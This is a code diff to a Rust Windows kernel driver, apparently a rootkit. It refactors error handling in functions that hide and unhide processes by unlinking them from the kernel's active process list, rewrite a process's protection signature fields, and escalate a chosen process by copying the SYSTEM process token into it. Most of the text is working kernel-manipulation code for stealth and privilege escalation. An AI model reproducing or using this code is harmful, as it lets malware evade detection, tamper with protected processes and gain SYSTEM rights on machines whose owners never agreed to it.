@@ -41,6 +41,7 @@ impl Process {
     /// # Returns
     /// - `Option<Self>`: Returns `Some(Self)` if the process lookup is successful, otherwise `None`.
     ///
+    #[inline]
     pub fn new(pid: usize) -> Option<Self> {
         let mut process = core::ptr::null_mut();
 
@@ -63,13 +64,11 @@ impl Process {
     ///
     pub unsafe fn process_toggle(process: *mut ProcessInfoHide) -> NTSTATUS {
         let pid = (*process).pid;
-        let status = if (*process).enable {
-            Self::hide_process(pid)
+        if (*process).enable {
+            Self::hide_process(pid).map(|_| STATUS_SUCCESS).unwrap_or_else(|err_code| err_code)
         } else {
-            Self::unhide_process(pid)
-        };
-
-        status
+            Self::unhide_process(pid).map(|_| STATUS_SUCCESS).unwrap_or_else(|err_code| err_code)
+        }
     }
 
     /// Hide a process by removing it from the list of active processes.
@@ -80,17 +79,14 @@ impl Process {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
-    unsafe fn hide_process(pid: usize) -> NTSTATUS {
+    unsafe fn hide_process(pid: usize) -> Result<(), NTSTATUS> {
         // Offsets
         let unique_process_id = get_offset_unique_process_id();
         let active_process_link_list = unique_process_id + core::mem::size_of::<usize>() as isize;
         let process_lock = unique_process_id - core::mem::size_of::<usize>() as isize;
 
         // Retrieving EPROCESS from the target process
-        let process = match Self::new(pid) {
-            Some(p) => p,
-            None => return STATUS_UNSUCCESSFUL,
-        };
+        let process = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
 
         let list_entry = process.e_process.cast::<u8>().offset(active_process_link_list) as PLIST_ENTRY;
         let push_lock = process.e_process.cast::<u8>().offset(process_lock) as *mut u64;
@@ -106,7 +102,6 @@ impl Process {
 
         let mut process_info = PROCESS_INFO_HIDE.lock();
         let list_ptr = Box::into_raw(Box::new(list));
-        log::info!("Stored list entry at: {:?}", list_ptr);
 
         process_info.push(HiddenProcessInfo  {
             pid,
@@ -123,7 +118,7 @@ impl Process {
 
         ExReleasePushLockExclusiveEx(push_lock, 0);
 
-        STATUS_SUCCESS
+        Ok(())
     }
 
     /// Unhide a process by removing it from the list of active processes.
@@ -134,17 +129,14 @@ impl Process {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
-    unsafe fn unhide_process(pid: usize) -> NTSTATUS {
+    unsafe fn unhide_process(pid: usize) -> Result<(), NTSTATUS> {
         // Offsets
         let unique_process_id = get_offset_unique_process_id();
         let active_process_link_list = unique_process_id + core::mem::size_of::<usize>() as isize;
         let process_lock = unique_process_id - core::mem::size_of::<usize>() as isize;
 
         // Retrieving EPROCESS from the target process
-        let process = match Self::new(pid) {
-            Some(p) => p,
-            None => return STATUS_UNSUCCESSFUL,
-        };
+        let process = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
 
         let list_entry = process.e_process.cast::<u8>().offset(active_process_link_list) as PLIST_ENTRY;
         let push_lock = process.e_process.cast::<u8>().offset(process_lock) as PULONG_PTR;
@@ -158,7 +150,7 @@ impl Process {
             let list = process.list_entry.load(Ordering::SeqCst);
             if list.is_null() {
                 log::error!("List entry stored in AtomicPtr is null");
-                return STATUS_INVALID_PARAMETER;
+                return Err(STATUS_INVALID_PARAMETER);
             }
 
             (*list_entry).Flink = (*list).Flink as *mut _LIST_ENTRY;
@@ -174,13 +166,13 @@ impl Process {
         } else {
             log::info!("PID ({pid}) Not found");
             ExReleasePushLockExclusiveEx(push_lock, 0);
-            return STATUS_UNSUCCESSFUL;
+            return Err(STATUS_UNSUCCESSFUL);
         }
 
         log::info!("Process with PID {pid} unhidden successfully.");
         ExReleasePushLockExclusiveEx(push_lock, 0);
 
-        STATUS_SUCCESS
+        Ok(())
     }
 
     /// Toggles the enumeration between hiding or protecting processes based on the options provided.
@@ -285,7 +277,7 @@ impl Process {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
-    pub unsafe fn protection_signature(signature_info: *mut ProcessSignature) -> NTSTATUS {
+    pub unsafe fn protection_signature(signature_info: *mut ProcessSignature) -> Result<(), NTSTATUS> {
         let pid = (*signature_info).pid;
         let sg = (*signature_info).sg;
         let tp = (*signature_info).tp;
@@ -294,10 +286,7 @@ impl Process {
         let protection_offset = get_offset_signature();
 
         // Retrieving EPROCESS from the target process
-        let process = match Self::new(pid) {
-            Some(p) => p,
-            None => return STATUS_UNSUCCESSFUL,
-        };
+        let process = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
 
         let new_sign = (sg << 4) | tp;
         let process_signature = process.e_process.cast::<u8>().offset(protection_offset) as *mut PROCESS_SIGNATURE;
@@ -306,7 +295,7 @@ impl Process {
         (*process_signature).protection.set_type_(tp as u8);
         (*process_signature).protection.set_signer(sg as u8);
 
-        STATUS_SUCCESS
+        Ok(())
     }
 
     /// Raises the token of the specified process to the system token.
@@ -321,7 +310,7 @@ impl Process {
     /// # Return
     /// - `NTSTATUS`: A status code indicating success or failure of the operation.
     ///
-    pub unsafe fn elevate_process(process: *mut TargetProcess) -> NTSTATUS {
+    pub unsafe fn elevate_process(process: *mut TargetProcess) -> Result<(), NTSTATUS> {
         let pid = (*process).pid;
         let system_process = 4;
 
@@ -329,16 +318,10 @@ impl Process {
         let token = get_offset_token();
 
         // Retrieving EPROCESS from the target process
-        let target = match Self::new(pid) {
-            Some(p) => p,
-            None => return STATUS_UNSUCCESSFUL,
-        };
+        let target = Self::new(pid).ok_or(STATUS_UNSUCCESSFUL)?;
 
         // Retrieving EPROCESS from the System process (By default the PID is 4)
-        let system = match Self::new(system_process) {
-            Some(p) => p,
-            None => return STATUS_UNSUCCESSFUL,
-        };
+        let system = Self::new(system_process).ok_or(STATUS_UNSUCCESSFUL)?;
 
         // Accessing EPROCESS.Token
         let target_token_ptr = target.e_process.cast::<u8>().offset(token) as *mut u64;
@@ -349,7 +332,7 @@ impl Process {
 
         log::info!("Elevate NT AUTHORITY\\SYSTEM for the process: {pid}");
 
-        STATUS_SUCCESS
+        Ok(())
     }
 
 }
